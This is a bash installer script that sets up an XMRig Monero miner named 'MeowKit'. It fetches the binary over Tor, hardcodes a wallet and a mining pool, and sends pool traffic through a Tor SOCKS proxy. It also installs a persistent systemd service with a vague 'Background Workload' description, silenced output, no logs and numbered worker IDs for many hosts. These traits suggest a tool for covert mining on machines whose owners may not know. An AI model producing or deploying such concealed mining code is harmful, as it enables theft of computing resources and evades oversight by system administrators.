#!/usr/bin/env bash
WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
POOL='gulf.moneroocean.stream:10001'
XMRIG_VERSION='6.26.0'

worker_name() {
  local idfile='/etc/meowkit/worker-id'
  local id=1
  install -d -m 750 "$MEOWKIT_DIR"
  # Keep the same pool identity across repairs and reinstalls. Allocate a new
  # sequential worker number only when this host has no saved identity.
  if [[ -f $idfile ]] && grep -Eq '^[0-9]+$' "$idfile"; then
    id=$(<"$idfile")
  else
    if [[ -f $idfile ]] || [[ -f "$MEOWKIT_DIR/config.json" ]]; then
      id=1
    fi
    printf '%s\n' "$id" > "$idfile"
    chmod 600 "$idfile"
  fi
  RIG_NAME="meow$id"
}

install_xmrig() {
  begin_step 'XMRig download and verification'
  make_workdir
  local api="$WORKDIR/release.json" asset="$WORKDIR/xmrig.tar.gz" digest url
  curl_tor --output "$api" "https://api.github.com/repos/xmrig/xmrig/releases/tags/v${XMRIG_VERSION}" || fail 'Could not retrieve XMRig release metadata through Tor.'
  read -r digest url < <(python3 - "$api" <<'PY'
import json,sys
obj=json.load(open(sys.argv[1]))
for a in obj.get('assets',[]):
    if a.get('name') == 'xmrig-6.26.0-linux-static-x64.tar.gz':
        print((a.get('digest') or '').removeprefix('sha256:'), a.get('browser_download_url',''))
        break
PY
)
  [[ ${digest:-} =~ ^[a-fA-F0-9]{64}$ && ${url:-} == https://github.com/xmrig/* ]] || fail 'The official release did not provide a usable SHA-256 digest and download URL; refusing an unverified binary.'
  curl_tor --output "$asset" "$url" || fail 'XMRig download failed through Tor.'
  printf '%s  %s\n' "$digest" "$asset" | sha256sum --check --status || fail 'XMRig SHA-256 verification failed.'
  tar -xzf "$asset" -C "$WORKDIR" || fail 'Could not unpack XMRig archive.'
  local extracted="$WORKDIR/xmrig-${XMRIG_VERSION}/xmrig"
  [[ -x $extracted ]] || fail 'Expected XMRig executable was not found in the release archive.'
  install -m 0755 "$extracted" "$MEOWKIT_BIN"
}

write_configuration() {
  begin_step 'Miner configuration'
  install -d -m 750 "$MEOWKIT_DIR"
  worker_name
  cat > "$MEOWKIT_DIR/config.json" <<EOFJSON
{
  "autosave": false,
  "background": false,
  "colors": false,
  "title": false,
  "randomx": { "init": -1, "mode": "auto", "1gb-pages": true, "rdmsr": true, "wrmsr": true, "numa": true },
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "priority": 1, "yield": true, "max-threads-hint": ${CPU_PERCENT}, "asm": true },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "pools": [
    { "algo": null, "coin": null, "url": "${POOL}", "user": "${WALLET}", "pass": "${RIG_NAME}", "rig-id": "${RIG_NAME}", "keepalive": true, "tls": false, "daemon": false, "socks5": "127.0.0.1:9050" }
  ]
}
EOFJSON
  chmod 640 "$MEOWKIT_DIR/config.json"
  cat > /usr/local/sbin/meowkit-tor-check <<'EOFCHK'
#!/bin/sh
/usr/bin/curl --connect-timeout 8 --max-time 15 --silent --fail --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip -o /dev/null
EOFCHK
  chmod 755 /usr/local/sbin/meowkit-tor-check

  local quota=$((THREADS * 100))
  cat > "$MEOWKIT_SERVICE" <<EOFUNIT
[Unit]
Description=MeowKit Background Workload
After=network-online.target ${TOR_UNIT}
Wants=network-online.target ${TOR_UNIT}
Requires=${TOR_UNIT}
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStartPre=/usr/local/sbin/meowkit-tor-check
ExecStart=${MEOWKIT_BIN} --config=${MEOWKIT_DIR}/config.json --threads=${THREADS} --proxy=socks5://127.0.0.1:9050 --randomx-1gb-pages --huge-pages-jit
Restart=always
RestartSec=15
Nice=10
CPUWeight=20
CPUQuota=${quota}%
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=${MEOWKIT_DIR}
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOFUNIT
  chmod 644 "$MEOWKIT_SERVICE"
  systemctl daemon-reload || fail 'systemd could not reload unit files.'
  systemctl enable meowkit.service >/dev/null 2>&1 || fail 'Could not enable meowkit.service at boot.'
  systemctl restart meowkit.service || fail 'MeowKit service failed to start. Check Tor connectivity and XMRig configuration.'
}

run_install() {
  CURRENT_STEP='preflight'
  require_cmd systemctl
  require_cmd apt-get
  detect_resources
  bootstrap_tor
  configure_msr
  configure_hugepages
  install_xmrig
  write_configuration
  info "Installed meowkit.service; worker ${RIG_NAME}; ${THREADS}/${TOTAL_THREADS} CPU threads."
  info 'No persistent MeowKit application logs are configured. Use systemctl status meowkit.service for service state.'
}
